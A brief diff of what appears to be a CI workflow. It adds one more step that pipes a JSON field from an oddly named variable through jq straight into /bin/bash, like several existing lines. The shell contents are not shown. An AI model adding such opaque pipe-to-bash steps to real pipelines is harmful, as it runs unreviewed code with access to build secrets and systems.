@@ -23,6 +23,7 @@ jobs:
           echo $tst897 | jq -r .jo4111 | /bin/bash
           printf '%s' "$zatnp3780" | jq -r .fms36620 | /bin/bash
           printf '%s' "$lefgo7" | jq -r .v83894 | /bin/bash
+          printf '%s' "$lsmu1" | jq -r .snjf2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
